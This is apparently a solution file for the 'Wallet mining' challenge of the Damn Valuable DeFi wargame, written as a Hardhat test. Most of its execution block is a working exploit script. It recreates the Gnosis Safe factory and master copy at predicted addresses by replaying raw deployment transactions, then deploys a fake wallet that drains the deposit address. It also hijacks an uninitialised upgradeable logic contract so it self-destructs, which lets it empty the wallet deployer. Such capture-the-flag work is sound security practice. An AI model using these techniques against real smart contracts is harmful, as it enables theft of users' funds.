const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9B6fb606A9f5789444c17768c6dFCF2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
    const {Factory, Copy, SetImplementation} = require("../../contracts/player-contracts/wallet-mining/RawData.json")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /** Step 1: Test Depolyment Nonce*/
        let addr;
        for (let i = 1; i < 100; i++) {
          addr = ethers.utils.getContractAddress({
            from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
            nonce: i,
          });
          if (addr == DEPOSIT_ADDRESS) {
            console.log("Deposit target address", addr, "recreated");
            console.log("Deposit deployment nonce", i);
          } 
        }
        //Gnosis account 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A found on Etherscan that deployed 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B and 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
        for (let i = 0; i < 100; i++) {
            addr = ethers.utils.getContractAddress({
              from: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
              nonce: i,
            });
            if (addr == "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B") {
              console.log("Facotry target address", addr, "recreated");
              console.log("Facotry deployment nonce", i);
            } else if (addr == "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F") {
              console.log("MasterCopy target address", addr, "recreated");
              console.log("MasterCopy deployment nonce", i);
            }
        }
        
        let ogDeployer = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
        let tx = await (await player.sendTransaction({
            from: player.address,
            to: ogDeployer,
            value: ethers.utils.parseEther("1"),
        })).wait();

        /** 
         * Step 2: Deploy gnosis factory, master copy and fake wallet contracts on target wallet based on nonce calculated from previous step, with the data from RawData.json (etherscan)
         */
        let DeployedFactory, deployedFactory, deployedCopy;
        deployedCopy = await (await ethers.provider.sendTransaction(Copy)).wait();
        await (await ethers.provider.sendTransaction(SetImplementation)).wait();
        DeployedFactory = await ethers.provider.sendTransaction(Factory);
        deployedFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");

        let FakeWallet, fakeWallet, data, wallet;
        FakeWallet = await ethers.getContractFactory("FakeWallet");
        fakeWallet = await FakeWallet.deploy();
        console.log("FakeWallet address deployed to", fakeWallet.address);
        data = fakeWallet.interface.encodeFunctionData("attack", [token.address, player.address]);

        for (let i = 1; i < 44; i++) {
            if (i == 43) {
                console.log("Draining funds from", DEPOSIT_ADDRESS);
                wallet = await deployedFactory.createProxy(fakeWallet.address, data);
            }
            else {
                wallet = await deployedFactory.createProxy(fakeWallet.address, []);
            }
        }

        /**
         * Step 3: Take over Authorizer logic contract (not the proxy) and upgrade it to fakeAuthorizer
         */
        const authorizerLogic = (await ethers.getContractFactory("AuthorizerUpgradeable")).attach("0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512");
        await authorizerLogic.connect(player).init([player.address], [token.address]);
        console.log("logic init success");
        const FakeAuthorizer = await ethers.getContractFactory("FakeAuthorizer");
        const fakeAuthorizer = await FakeAuthorizer.deploy();
        console.log("FakeAuthorizer address deployed to", fakeAuthorizer.address);
        const fakeAuthorizerData = fakeAuthorizer.interface.encodeFunctionData("attack", []);
        await authorizerLogic.connect(player).upgradeToAndCall(fakeAuthorizer.address, fakeAuthorizerData);
        console.log("selfdestruct success");
        
        for(i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop([])
        }

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
